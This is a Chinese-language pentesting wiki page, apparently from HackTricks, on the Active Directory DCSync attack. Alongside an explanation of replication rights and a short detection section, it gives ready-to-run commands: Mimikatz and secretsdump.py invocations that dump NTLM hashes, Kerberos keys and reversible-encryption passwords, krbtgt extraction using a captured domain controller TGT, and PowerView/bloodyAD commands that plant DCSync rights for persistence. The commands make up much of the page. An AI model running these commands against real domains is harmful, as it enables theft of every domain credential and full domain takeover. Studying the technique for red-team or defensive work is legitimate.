# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

**DCSync** 权限意味着在域本身上拥有以下权限：**DS-Replication-Get-Changes**、**Replicating Directory Changes All** 和 **Replicating Directory Changes In Filtered Set**。<sup>[[3]](#references)</sup>

**DCSync 重要说明：**

- **DCSync 攻击会模拟域控制器的行为，并通过目录复制服务远程协议 (MS-DRSR) 请求其他域控制器复制信息**。由于 MS-DRSR 是 Active Directory 的有效且必需的功能，因此无法关闭或禁用它。
- 默认情况下，只有 **Domain Admins、Enterprise Admins、Administrators 和 Domain Controllers** 组拥有所需的权限。
- 实际上，**完整的 DCSync** 需要在域命名上下文中拥有 **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** 权限。`DS-Replication-Get-Changes-In-Filtered-Set` 通常也会与它们一起委派，但单独使用时，它与同步**机密 / RODC 筛选属性**（例如旧版 LAPS 风格的机密）关系更大，而非完整转储 krbtgt。<sup>[[2]](#references)</sup>
- 如果任何帐户密码以可逆加密方式存储，可以使用 Mimikatz 中的一个选项以明文形式返回密码。

### 枚举

使用 `powerview` 检查哪些用户拥有这些权限：

```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```

如果你想重点检查拥有 DCSync 权限的**非默认主体**，请筛除内置的具备复制能力的组，仅审查非预期的受托对象：

```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
  Where-Object {
    $_.ObjectType -match 'replication-get' -or
    $_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
  } |
  Where-Object { $_.IdentityReference -notmatch $default } |
  Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```

### 本地利用

```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

### 远程利用

```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```

实用的范围限定示例：<sup>[[1]](#references)</sup>

```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```

### 使用捕获的 DC machine TGT (ccache) 执行 DCSync

检查域控制器上的服务时，应区分其本地服务身份与网络身份。[Microsoft 文档](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions)指出，SQL Server 虚拟帐户（`NT SERVICE\...`）访问网络资源时使用主机计算机帐户。在域控制器上，这意味着 DC machine account 可能与复制权限审查有关；但仅仅取得服务 foothold，并不能证明存在可导出的 machine TGT 或可用于 DCSync 的身份验证凭据。在将其视为一条攻击路径之前，请验证实际服务身份、出站身份验证上下文、可用的票据或凭据，以及有效的复制权限。

在 unconstrained-delegation 的导出模式场景中，你可能会捕获到 Domain Controller machine TGT（例如，用于 `krbtgt@DOMAIN` 的 `DC1$@DOMAIN`）。随后，你可以使用该 ccache，以 DC 身份进行身份验证并执行 DCSync，无需密码。<sup>[[5]](#references)</sup>

```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```

操作说明：

- **Impacket 的 Kerberos 路径会先访问 SMB**，然后才调用 DRSUAPI。如果环境强制执行 **SPN 目标名称验证**，完整转储可能会失败，并提示 `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`。
- 此时，可以先为目标 DC 请求 **`cifs/<dc>`** 服务票据，或者使用 **`-just-dc-user`**，立即获取所需账户的信息。
- 如果你只有较低级别的复制权限，基于 LDAP/DirSync 的同步仍可能泄露 **机密**或**经过 RODC 筛选的**属性（例如旧版 `ms-Mcs-AdmPwd`），而无需完整复制 krbtgt。<sup>[[2]](#references)</sup>

`-just-dc` 会生成 3 个文件：

- 一个包含 **NTLM 哈希**
- 一个包含 **Kerberos 密钥**
- 一个包含 NTDS 中启用了[**可逆加密**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption)的账户的明文密码。你可以使用以下命令获取启用了可逆加密的用户：

  ```bash
  Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
  ```

### 持久化

如果你是域管理员，可以借助 PowerView 将这些权限授予任意用户：<sup>[[3]](#references)</sup>

```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```

Linux 操作者也可以使用 `bloodyAD` 执行相同操作：

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```

然后，你可以通过检查以下命令的输出，**确认用户是否已正确分配**这 3 项权限（你应该能在 "ObjectType" 字段中看到这些权限的名称）：

```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```

### 缓解措施

- 安全事件 ID 4662（必须启用对象审核策略）——对对象执行了操作<sup>[[4]](#references)</sup>
- 安全事件 ID 5136（必须启用对象审核策略）——目录服务对象已修改
- 安全事件 ID 4670（必须启用对象审核策略）——对象权限已更改
- AD ACL Scanner - 创建并比较 ACL 报告。[https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [1] [Impacket 变更日志](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [2] [DirSync：利用 Replication Get-Changes 和 Get-Changes-In-Filtered-Set](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [3] [DCSync：从域控制器转储密码哈希](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [4] [DCSync](https://yojimbosecurity.ninja/dcsync/)
- [5] [HTB：Delegate — SYSVOL 凭据 → 定向 Kerberoast → 无约束委派 → DCSync 获取 DA 权限](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
{{#include ../../banners/hacktricks-training.md}}
